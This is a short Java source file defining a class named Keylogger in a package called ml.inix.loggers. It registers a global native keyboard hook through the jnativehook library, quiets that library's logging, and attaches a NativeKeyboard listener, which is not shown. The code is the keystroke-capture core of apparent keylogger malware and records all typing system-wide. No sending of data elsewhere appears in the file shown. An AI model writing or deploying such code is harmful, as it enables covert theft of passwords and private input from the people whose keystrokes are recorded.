package ml.inix.loggers;

import ml.inix.util.Color;
import ml.inix.util.Log;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger {
    public static void init() {
        try {
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.WARNING);
            logger.setUseParentHandlers(false);
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            Log.out(Color.RED + e.getMessage());
        }
        GlobalScreen.addNativeKeyListener(new NativeKeyboard());
    }
}
